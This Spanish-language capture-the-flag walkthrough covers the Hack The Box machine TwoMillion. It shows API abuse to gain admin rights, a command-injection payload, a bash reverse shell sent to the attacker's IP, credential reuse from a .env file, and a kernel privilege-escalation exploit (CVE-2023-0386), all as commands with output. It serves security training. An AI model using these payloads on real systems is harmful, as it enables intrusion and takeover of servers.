
# TwoMillion

<figure><img src="/files/QgtOpLFIiGeozAvgjhp7" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `TwoMillion`
* **IP:** `10.10.11.221`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `23/12/2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sCV -T5 10.10.11.221
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://2million.htb/
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

### Acceso Web

Accedemos a `http://2million.htb` y observamos que parece ser una plataforma labs de Hack the Box:

<figure><img src="/files/S4rnqBJOTR5BqvLSD6GF" alt=""><figcaption></figcaption></figure>

Solo nos podemos registrar en esta página con un código de invitación.

En el apartado `/invite` encontramos un input para introducir un código de invitación a través del archivo javascript `/js/inviteapi.min.js` que es bastante sospechoso:

<figure><img src="/files/32aWxuU7MyWTojPw2i74" alt=""><figcaption></figcaption></figure>

Viendo el archivo js tiene la siguiente estructura:

{% code overflow="wrap" %}

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

{% endcode %}

Parece que `makeInviteCode` es la función de JavaScript que nos da la primera pista sobre cómo obtener un código de invitación.

Para testearlo haremos una petición POST al endpoint `/api/v1/invite/how/to/generate`, y vemos que los datos están cifrados en `ROT13`:

<figure><img src="/files/JBJLyuCwvWOe3C8P0EnH" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}

```json
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

{% endcode %}

Con Cyberchef lo desencriptamos fácilmente:

<figure><img src="/files/cKvY4gzZBWfgIORQ0bHz" alt=""><figcaption></figcaption></figure>

Y descubrimos que para generar un código de invitación deberemos hacer una solicitud POST a `/api/v1/invite/generate`:

```json
curl -X POST http://2million.htb/api/v1/invite/generate
        
{"0":200,"success":1,"data":{"code":"M0dNWU4tOFk4WUYtWkoxN0ItODdTVUU=","format":"encoded"}}
```

Bingo! Tenemos un código de invitación, pero al introducirlo nos dice que es inválido, ya que está codificado en `base64` (nos da una pista el = del final). Con Cyberchef lo decodificamos fácilmente:

<figure><img src="/files/g9UzbsSjMig3n5vzEM2Q" alt=""><figcaption></figcaption></figure>

```
3GMYN-8Y8YF-ZJ17B-87SUE
```

Vamos a probarlo:

<figure><img src="/files/2dYf4GVOH2GL1AvvGi5q" alt=""><figcaption></figcaption></figure>

Y bingo, ya nos deja crearnos una cuenta:

<figure><img src="/files/CJbwCb6vEXVmAD84oLBh" alt=""><figcaption></figcaption></figure>

Y nos logueamos sin problema:

<figure><img src="/files/FhFNy2H5uVXHnMVrlc3Y" alt=""><figcaption></figcaption></figure>

### Enumeración interna

En al apartado Access, al darle a `Connection Pack` vemos que hace una petición al endpoint `/api/v1/user/vpn/generate`

<figure><img src="/files/sAnlvclvnqbbFBx5zebS" alt=""><figcaption></figcaption></figure>

#### Enumeración de la API

```json
curl -s -H "Cookie: PHPSESSID=ug2cq4afgbq82smoqavk2g6bt1" http://2million.htb/api/v1 | jq .

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Según la respuesta del endpoint `/api/v1`, bajo `/api/v1/admin` hay **3 endpoints** distintos (uno por cada método HTTP):

1. `GET /api/v1/admin/auth`
2. `POST /api/v1/admin/vpn/generate`
3. `PUT /api/v1/admin/settings/update`

Concretamente el que más nos interesa es `/api/v1/admin/settings/update`, ya que nos permitiría cambiar nuestra cuenta de usuario a una cuenta de administrador.

***

## <mark style="color:purple;">Explotación de la API</mark>

#### Comprobar si nuestro usuario es admin

Spoiler, no lo es:

```bash
curl -s -H "Cookie: PHPSESSID=ug2cq4afgbq82smoqavk2g6bt1" http://2million.htb/api/v1/admin/auth | jq .

{
  "message": false
}
```

#### Convertirnos en administrador

```bash
curl -X PUT -H "Cookie: PHPSESSID=ug2cq4afgbq82smoqavk2g6bt1" \
     -H "Content-Type: application/json" \
     -d '{"email": "afsh4ck@test.es", "is_admin": 1}' \
     http://2million.htb/api/v1/admin/settings/update | jq .
     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    86    0    43  100    43    564    564 --:--:-- --:--:-- --:--:--  1131

{
  "id": 17,
  "username": "afsh4ck",
  "is_admin": 1
}
```

#### Comprobación

<pre class="language-bash"><code class="lang-bash">curl -s -H "Cookie: PHPSESSID=ug2cq4afgbq82smoqavk2g6bt1" http://2million.htb/api/v1/admin/auth | jq .
<strong>
</strong><strong>{
</strong>  "message": true
}
</code></pre>

Ya somos admin!

### Command Injection

Después de testear todos los endpoints, bservamos que el endpoint `/api/v1/admin/vpn/generate` es vulnerable a Command Injection:

```bash
curl -X POST -H "Cookie: PHPSESSID=ug2cq4afgbq82smoqavk2g6bt1" \
     -H "Content-Type: application/json" \
     -d '{"username": "test; whoami;"}' \
     http://2million.htb/api/v1/admin/vpn/generate
     
www-data
```

### Reverse Shell

Podemos escalar esto a RCE con el siguiente payload:

```bash
nc -nlvp 4444
```

```bash
curl -X POST -H "Cookie: PHPSESSID=ug2cq4afgbq82smoqavk2g6bt1" \
     -H "Content-Type: application/json" \
     -d '{"username": "afsh4ck; bash -c \"bash -i >& /dev/tcp/10.10.15.211/4444 0>&1\""}' \
     http://2million.htb/api/v1/admin/vpn/generate
```

<figure><img src="/files/bDQw550IgI3uvyNAtrM1" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Acceso Inicial</mark>

Vemos que somos el usuario `www-data` y al acceder al directorio `/home` solo encontramos un directorio `/admin` en el que está la user flag pero no podemos leerla:

```shellscript
www-data@2million:~/html$ cd /home
www-data@2million:/home$ ls
admin

www-data@2million:/home$ cd admin
www-data@2million:/home/admin$ ls
linpeas.sh
snap
user.txt

www-data@2million:/home/admin$ cat user.txt
cat: user.txt: Permission denied
```

Ejecutaremos un Linpeas para ver posibles vectores de escalada de privilegios:

```bash
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 root root 87 Jun  2  2023 /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Encontramos un archivo `.env` con credenciales expuestas de `admin`

Y nos marca un punto ULTRA DESTACADO:

<figure><img src="/files/yyvq93Pt7jII92RQaePX" alt=""><figcaption></figcaption></figure>

```
You can write SUID file: /tmp/CVE-2023-0386/ovlcap/upper/file
```

### Acceso SSH

Probamos a acceder con esas credenciales por SSH, y funciona!

```bash
ssh admin@10.10.11.221
                                
The authenticity of host '10.10.11.221 (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.221' (ED25519) to the list of known hosts.
admin@10.10.11.221's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

admin@2million:~$ whoami
admin
```

***

## <mark style="color:purple;">User Flag</mark>

```bash
admin@2million:~$ cat user.txt 
50c3543e967864e2a28cc1**********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario admin:

```bash
admin@2million:~$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on localhost.
```

### CVE-2023-0386

Linpeas ya nos marcó esto como punto amarilo ULTRA destacado:

```
You can write SUID file: /tmp/CVE-2023-0386/ovlcap/upper/file
```

Vamos a intentar explotarlo, usaremos el siguiente exploit:

{% embed url="<https://github.com/xkaneiki/CVE-2023-0386>" %}

```bash
# Clonar el repositorio del exploit
git clone https://github.com/xkaneiki/CVE-2023-0386
python3 -m http.server 80
```

<pre class="language-bash"><code class="lang-bash"># Descargar en el objetivo y compilar
admin@2million:$ cd /tmp
<strong>admin@2million:/tmp$ wget -r http://10.10.15.211
</strong>admin@2million:/tmp$ cd CVE-2023-0386
admin@2million:/tmp$ make all
</code></pre>

Eso nos generará los ejecutables necesarios, y lo ejecutamos de la siguiente manera:

```bash
admin@2million:/tmp/CVE-2023-0386$ ./exp

uid:1000 gid:1000
[+] mount success
total 24
drwxrwxr-x 1 root   root     4096 Dec 23 18:44 .
drwxr-xr-x 6 root   root     4096 Dec 23 18:44 ..
-rwsrwxrwx 1 nobody nogroup 16096 Dec 23 18:44 file
open: Text file busy
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# whoami
root
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
root@2million:/tmp/CVE-2023-0386# cd /root
root@2million:~# ls
root.txt  snap  thank_you.json

root@2million:~# cat root.txt
b512679890b82b5e581f38**********
```
